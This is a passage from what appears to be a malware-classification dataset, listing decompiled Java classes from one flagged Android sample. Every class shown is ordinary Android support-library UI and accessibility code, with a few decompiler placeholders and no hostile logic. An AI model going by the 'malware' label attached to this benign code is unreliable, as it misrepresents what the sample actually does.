} break; case 2: if (Math.abs(x - this.mInitialMotionX) > this.mTouchSlop || Math.abs(y - this.mInitialMotionY) > this.mTouchSlop) { this.mIgnoreTap=true; break; } break; } return true; } @Override protected void onDraw(Canvas canvas){ super.onDraw(canvas); int height=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=height - this.mIndicatorHeight; this.mTabPaint.setColor((this.mTabAlpha << 24) | (this.mIndicatorColor & com.fw.tzthree.v4.viewpager.ViewCompat.MEASURED_SIZE_MASK)); canvas.drawRect(left,top,right,height,this.mTabPaint); if (this.mDrawFullUnderline) { this.mTabPaint.setColor((-16777216) | (this.mIndicatorColor & com.fw.tzthree.v4.viewpager.ViewCompat.MEASURED_SIZE_MASK)); canvas.drawRect(getPaddingLeft(),height - this.mFullUnderlineHeight,getWidth() - getPaddingRight(),height,this.mTabPaint); } } @Override public void updateTextPositions(int position,float positionOffset,boolean force){ Rect r=this.mTempRect; int bottom=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=bottom - this.mIndicatorHeight; r.set(left,top,right,bottom); super.updateTextPositions(position,positionOffset,force); this.mTabAlpha=(int)(Math.abs(positionOffset - 0.5f) * 2.0f * 255.0f); int left2=this.mCurrText.getLeft() - this.mTabPadding; int right2=this.mCurrText.getRight() + this.mTabPadding; r.union(left2,top,right2,bottom); invalidate(r); } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PagerTitleStrip.code","!org.eclipse.jdt.core.dom.TypeDeclaration@d088f02"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PagerTitleStripIcs.code","class PagerTitleStripIcs {   PagerTitleStripIcs(){   }   public static void setSingleLineAllCaps(  TextView text){     text.setTransformationMethod(new SingleLineAllCapsTransform(text.getContext()));   } private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {     private static final String TAG=""SingleLineAllCapsTransform"";     private Locale mLocale;     public SingleLineAllCapsTransform(    Context context){       this.mLocale=context.getResources().getConfiguration().locale;     }     @Override public CharSequence getTransformation(    CharSequence source,    View view){       CharSequence source2=super.getTransformation(source,view);       if (source2 != null) {         return source2.toString().toUpperCase(this.mLocale);       }       return null;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PagerTitleStripImpl.code","public interface PagerTitleStripImpl {   void setSingleLineAllCaps(  TextView textView); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PagerTitleStripImplBase.code","static class PagerTitleStripImplBase implements PagerTitleStripImpl {   PagerTitleStripImplBase(){   }   @Override public void setSingleLineAllCaps(  TextView text){     text.setSingleLine();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PagerTitleStripImplIcs.code","static class PagerTitleStripImplIcs implements PagerTitleStripImpl {   PagerTitleStripImplIcs(){   }   @Override public void setSingleLineAllCaps(  TextView text){     PagerTitleStripIcs.setSingleLineAllCaps(text);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PageTransformer.code","public interface PageTransformer {   void transformPage(  View view,  float f); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=ParcelableCompat.newCreator(new ParcelableCompatCreatorCallbacks<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in,    ClassLoader loader){       return new SavedState(in,loader);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } );   Parcelable adapterState;   ClassLoader loader;   int position;   public SavedState(  Parcelable superState){     super(superState);   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeInt(this.position);     out.writeParcelable(this.adapterState,flags);   }   public String toString(){     return ""FragmentPager.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" position=""+ this.position+ ""}"";   }   SavedState(  Parcel in,  ClassLoader loader){     super(in);     loader=loader == null ? getClass().getClassLoader() : loader;     this.position=in.readInt();     this.adapterState=in.readParcelable(loader);     this.loader=loader;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\SimpleOnPageChangeListener.code","public static class SimpleOnPageChangeListener implements OnPageChangeListener {   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){   }   @Override public void onPageSelected(  int position){   }   @Override public void onPageScrollStateChanged(  int state){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\SingleLineAllCapsTransform.code","private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {   private static final String TAG=""SingleLineAllCapsTransform"";   private Locale mLocale;   public SingleLineAllCapsTransform(  Context context){     this.mLocale=context.getResources().getConfiguration().locale;   }   @Override public CharSequence getTransformation(  CharSequence source,  View view){     CharSequence source2=super.getTransformation(source,view);     if (source2 != null) {       return source2.toString().toUpperCase(this.mLocale);     }     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\VelocityTrackerCompat.code","public class VelocityTrackerCompat {   static final VelocityTrackerVersionImpl IMPL; interface VelocityTrackerVersionImpl {     float getXVelocity(    VelocityTracker velocityTracker,    int i);     float getYVelocity(    VelocityTracker velocityTracker,    int i);   } static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     BaseVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getXVelocity();     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getYVelocity();     }   } static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     HoneycombVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombVelocityTrackerVersionImpl();     }  else {       IMPL=new BaseVelocityTrackerVersionImpl();     }   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getXVelocity(tracker,pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\VelocityTrackerCompatHoneycomb.code","class VelocityTrackerCompatHoneycomb {   VelocityTrackerCompatHoneycomb(){   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity(pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity(pointerId);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\VelocityTrackerVersionImpl.code","interface VelocityTrackerVersionImpl {   float getXVelocity(  VelocityTracker velocityTracker,  int i);   float getYVelocity(  VelocityTracker velocityTracker,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewCompat.code","public class ViewCompat {   private static final long FAKE_FRAME_TIME=10;   static final ViewCompatImpl IMPL;   public static final int IMPORTANT_FOR_ACCESSIBILITY_AUTO=0;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO=2;   public static final int IMPORTANT_FOR_ACCESSIBILITY_YES=1;   public static final int LAYER_TYPE_HARDWARE=2;   public static final int LAYER_TYPE_NONE=0;   public static final int LAYER_TYPE_SOFTWARE=1;   public static final int OVER_SCROLL_ALWAYS=0;   public static final int OVER_SCROLL_IF_CONTENT_SCROLLS=1;   public static final int OVER_SCROLL_NEVER=2; interface ViewCompatImpl {     boolean canScrollHorizontally(    View view,    int i);     boolean canScrollVertically(    View view,    int i);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view);     int getImportantForAccessibility(    View view);     int getLabelFor(    View view);     int getLayerType(    View view);     int getOverScrollMode(    View view);     boolean hasTransientState(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void postInvalidateOnAnimation(    View view);     void postInvalidateOnAnimation(    View view,    int i,    int i2,    int i3,    int i4);     void postOnAnimation(    View view,    Runnable runnable);     void postOnAnimationDelayed(    View view,    Runnable runnable,    long j);     void setAccessibilityDelegate(    View view,    AccessibilityDelegateCompat accessibilityDelegateCompat);     void setHasTransientState(    View view,    boolean z);     void setImportantForAccessibility(    View view,    int i);     void setLabelFor(    View view,    int i);     void setLayerType(    View view,    int i,    Paint paint);     void setOverScrollMode(    View view,    int i);   } static class BaseViewCompatImpl implements ViewCompatImpl {     BaseViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return false;     }     @Override public boolean canScrollVertically(    View v,    int direction){       return false;     }     @Override public int getOverScrollMode(    View v){       return 2;     }     @Override public void setOverScrollMode(    View v,    int mode){     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){     }     @Override public boolean hasTransientState(    View view){       return false;     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){     }     @Override public void postInvalidateOnAnimation(    View view){       view.postInvalidateDelayed(getFrameTime());     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       view.postDelayed(action,getFrameTime());     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       view.postDelayed(action,getFrameTime() + delayMillis);     }     long getFrameTime(){       return ViewCompat.FAKE_FRAME_TIME;     }     @Override public int getImportantForAccessibility(    View view){       return 0;     }     @Override public void setImportantForAccessibility(    View view,    int mode){     }     @Override public boolean performAccessibilityAction(    View view,    int action,    Bundle arguments){       return false;     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       return null;     }     @Override public void setLayerType(    View view,    int layerType,    Paint paint){     }     @Override public int getLayerType(    View view){       return 0;     }     @Override public int getLabelFor(    View view){       return 0;     }     @Override public void setLabelFor(    View view,    int id){     }   } static class GBViewCompatImpl extends BaseViewCompatImpl {     GBViewCompatImpl(){     }     @Override public int getOverScrollMode(    View v){       return ViewCompatGingerbread.getOverScrollMode(v);     }     @Override public void setOverScrollMode(    View v,    int mode){       ViewCompatGingerbread.setOverScrollMode(v,mode);     }   } static class HCViewCompatImpl extends GBViewCompatImpl {     HCViewCompatImpl(){     }     @Override long getFrameTime(){       return ViewCompatHC.getFrameTime();     }     @Override public void setLayerType(    View view,    int layerType,    Paint paint){       ViewCompatHC.setLayerType(view,layerType,paint);     }     @Override public int getLayerType(    View view){       return ViewCompatHC.getLayerType(view);     }   } static class ICSViewCompatImpl extends HCViewCompatImpl {     ICSViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return ViewCompatICS.canScrollHorizontally(v,direction);     }     @Override public boolean canScrollVertically(    View v,    int direction){       return ViewCompatICS.canScrollVertically(v,direction);     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onPopulateAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onInitializeAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){       ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){       ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());     }   } static class JBViewCompatImpl extends ICSViewCompatImpl {     JBViewCompatImpl(){     }     @Override public boolean hasTransientState(    View view){       return ViewCompatJB.hasTransientState(view);     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){       ViewCompatJB.setHasTransientState(view,hasTransientState);     }     @Override public void postInvalidateOnAnimation(    View view){       ViewCompatJB.postInvalidateOnAnimation(view);     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       ViewCompatJB.postOnAnimation(view,action);     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);     }     @Override public int getImportantForAccessibility(    View view){       return ViewCompatJB.getImportantForAccessibility(view);     }     @Override public void setImportantForAccessibility(    View view,    int mode){       ViewCompatJB.setImportantForAccessibility(view,mode);     }     @Override public boolean performAccessibilityAction(    View view,    int action,    Bundle arguments){       return ViewCompatJB.performAccessibilityAction(view,action,arguments);     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);       if (compat != null) {         return new AccessibilityNodeProviderCompat(compat);       }       return null;     }   } static class JbMr1ViewCompatImpl extends JBViewCompatImpl {     JbMr1ViewCompatImpl(){     }     @Override public int getLabelFor(    View view){       return ViewCompatJellybeanMr1.getLabelFor(view);     }     @Override public void setLabelFor(    View view,    int id){       ViewCompatJellybeanMr1.setLabelFor(view,id);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 17) {       IMPL=new JbMr1ViewCompatImpl();       return;     }     if (version >= 16) {       IMPL=new JBViewCompatImpl();       return;     }     if (version >= 14) {       IMPL=new ICSViewCompatImpl();       return;     }     if (version >= 11) {       IMPL=new HCViewCompatImpl();     }  else     if (version >= 9) {       IMPL=new GBViewCompatImpl();     }  else {       IMPL=new BaseViewCompatImpl();     }   }   public static boolean canScrollHorizontally(  View v,  int direction){     return IMPL.canScrollHorizontally(v,direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return IMPL.canScrollVertically(v,direction);   }   public static int getOverScrollMode(  View v){     return IMPL.getOverScrollMode(v);   }   public static void setOverScrollMode(  View v,  int overScrollMode){     IMPL.setOverScrollMode(v,overScrollMode);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(v,info);   }   public static void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     IMPL.setAccessibilityDelegate(v,delegate);   }   public static boolean hasTransientState(  View view){     return IMPL.hasTransientState(view);   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     IMPL.setHasTransientState(view,hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     IMPL.postInvalidateOnAnimation(view);   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     IMPL.postInvalidateOnAnimation(view,left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     IMPL.postOnAnimation(view,action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     IMPL.postOnAnimationDelayed(view,action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return IMPL.getImportantForAccessibility(view);   }   public static void setImportantForAccessibility(  View view,  int mode){     IMPL.setImportantForAccessibility(view,mode);   }   public static boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return IMPL.performAccessibilityAction(view,action,arguments);   }   public static AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return IMPL.getAccessibilityNodeProvider(view);   }   public static void setLayerType(  View view,  int layerType,  Paint paint){     IMPL.setLayerType(view,layerType,paint);   }   public static int getLayerType(  View view){     return IMPL.getLayerType(view);   }   public static int getLabelFor(  View view){     return IMPL.getLabelFor(view);   }   public static void setLabelFor(  View view,  int labeledId){     IMPL.setLabelFor(view,labeledId);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewCompatGingerbread.code","class ViewCompatGingerbread {   ViewCompatGingerbread(){   }   public static int getOverScrollMode(  View v){     return v.getOverScrollMode();   }   public static void setOverScrollMode(  View v,  int mode){     v.setOverScrollMode(mode);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewCompatHC.code","class ViewCompatHC {   ViewCompatHC(){   }   public static long getFrameTime(){     return ValueAnimator.getFrameDelay();   }   public static void setLayerType(  View view,  int layerType,  Paint paint){     view.setLayerType(layerType,paint);   }   public static int getLayerType(  View view){     return view.getLayerType();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewCompatICS.code","class ViewCompatICS {   ViewCompatICS(){   }   public static boolean canScrollHorizontally(  View v,  int direction){     return v.canScrollHorizontally(direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return v.canScrollVertically(direction);   }   public static void setAccessibilityDelegate(  View v,  Object delegate){     v.setAccessibilityDelegate((View.AccessibilityDelegate)delegate);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onPopulateAccessibilityEvent(event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onInitializeAccessibilityEvent(event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  Object info){     v.onInitializeAccessibilityNodeInfo((AccessibilityNodeInfo)info);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewCompatImpl.code","interface ViewCompatImpl {   boolean canScrollHorizontally(  View view,  int i);   boolean canScrollVertically(  View view,  int i);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view);   int getImportantForAccessibility(  View view);   int getLabelFor(  View view);   int getLayerType(  View view);   int getOverScrollMode(  View view);   boolean hasTransientState(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void postInvalidateOnAnimation(  View view);   void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4);   void postOnAnimation(  View view,  Runnable runnable);   void postOnAnimationDelayed(  View view,  Runnable runnable,  long j);   void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat);   void setHasTransientState(  View view,  boolean z);   void setImportantForAccessibility(  View view,  int i);   void setLabelFor(  View view,  int i);   void setLayerType(  View view,  int i,  Paint paint);   void setOverScrollMode(  View view,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewCompatJB.code","public class ViewCompatJB {   public static boolean hasTransientState(  View view){     return view.hasTransientState();   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     view.setHasTransientState(hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     view.postInvalidateOnAnimation();   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidate(left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     view.postOnAnimation(action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postOnAnimationDelayed(action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return view.getImportantForAccessibility();   }   public static void setImportantForAccessibility(  View view,  int mode){     view.setImportantForAccessibility(mode);   }   public static boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return view.performAccessibilityAction(action,arguments);   }   public static Object getAccessibilityNodeProvider(  View view){     return view.getAccessibilityNodeProvider();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewCompatJellybeanMr1.code","public class ViewCompatJellybeanMr1 {   public static int getLabelFor(  View view){     return view.getLabelFor();   }   public static void setLabelFor(  View view,  int id){     view.setLabelFor(id);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewConfigurationCompat.code","public class ViewConfigurationCompat {   static final ViewConfigurationVersionImpl IMPL; interface ViewConfigurationVersionImpl {     int getScaledPagingTouchSlop(    ViewConfiguration viewConfiguration);   } static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     BaseViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return config.getScaledTouchSlop();     }   } static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     FroyoViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new FroyoViewConfigurationVersionImpl();     }  else {       IMPL=new BaseViewConfigurationVersionImpl();     }   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return IMPL.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewConfigurationCompatFroyo.code","class ViewConfigurationCompatFroyo {   ViewConfigurationCompatFroyo(){   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledPagingTouchSlop();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewConfigurationVersionImpl.code","interface ViewConfigurationVersionImpl {   int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewGroupCompat.code","public class ViewGroupCompat {   static final ViewGroupCompatImpl IMPL; interface ViewGroupCompatImpl {     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);   } static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {     ViewGroupCompatStubImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return true;     }   } static class ViewGroupCompatIcsImpl extends ViewGroupCompatStubImpl {     ViewGroupCompatIcsImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new ViewGroupCompatIcsImpl();     }  else {       IMPL=new ViewGroupCompatStubImpl();     }   }   private ViewGroupCompat(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(group,child,event);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewGroupCompatIcs.code","class ViewGroupCompatIcs {   ViewGroupCompatIcs(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return group.onRequestSendAccessibilityEvent(child,event);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewGroupCompatIcsImpl.code","static class ViewGroupCompatIcsImpl extends ViewGroupCompatStubImpl {   ViewGroupCompatIcsImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewGroupCompatImpl.code","interface ViewGroupCompatImpl {   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewGroupCompatStubImpl.code","static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {   ViewGroupCompatStubImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewPager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@13908287"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ViewPositionComparator.code","public static class ViewPositionComparator implements Comparator<View> {   ViewPositionComparator(){   }   @Override public int compare(  View lhs,  View rhs){     LayoutParams llp=(LayoutParams)lhs.getLayoutParams();     LayoutParams rlp=(LayoutParams)rhs.getLayoutParams();     if (llp.isDecor != rlp.isDecor) {       return llp.isDecor ? 1 : -1;     }     return llp.position - rlp.position;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityEventCompat.code","public class AccessibilityEventCompat {   private static final AccessibilityEventVersionImpl IMPL;   public static final int TYPES_ALL_MASK=-1;   public static final int TYPE_ANNOUNCEMENT=16384;   public static final int TYPE_GESTURE_DETECTION_END=524288;   public static final int TYPE_GESTURE_DETECTION_START=262144;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_END=1024;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_START=512;   public static final int TYPE_TOUCH_INTERACTION_END=2097152;   public static final int TYPE_TOUCH_INTERACTION_START=1048576;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUSED=32768;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED=65536;   public static final int TYPE_VIEW_HOVER_ENTER=128;   public static final int TYPE_VIEW_HOVER_EXIT=256;   public static final int TYPE_VIEW_SCROLLED=4096;   public static final int TYPE_VIEW_TEXT_SELECTION_CHANGED=8192;   public static final int TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY=131072;   public static final int TYPE_WINDOW_CONTENT_CHANGED=2048; interface AccessibilityEventVersionImpl {     void appendRecord(    AccessibilityEvent accessibilityEvent,    Object obj);     Object getRecord(    AccessibilityEvent accessibilityEvent,    int i);     int getRecordCount(    AccessibilityEvent accessibilityEvent);   } static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {     AccessibilityEventStubImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return null;     }     @Override public int getRecordCount(    AccessibilityEvent event){       return 0;     }   } static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {     AccessibilityEventIcsImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){       AccessibilityEventCompatIcs.appendRecord(event,record);     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return AccessibilityEventCompatIcs.getRecord(event,index);     }     @Override public int getRecordCount(    AccessibilityEvent event){       return AccessibilityEventCompatIcs.getRecordCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityEventIcsImpl();     }  else {       IMPL=new AccessibilityEventStubImpl();     }   }   private AccessibilityEventCompat(){   }   public static int getRecordCount(  AccessibilityEvent event){     return IMPL.getRecordCount(event);   }   public static void appendRecord(  AccessibilityEvent event,  AccessibilityRecordCompat record){     IMPL.appendRecord(event,record.getImpl());   }   public static AccessibilityRecordCompat getRecord(  AccessibilityEvent event,  int index){     return new AccessibilityRecordCompat(IMPL.getRecord(event,index));   } } "
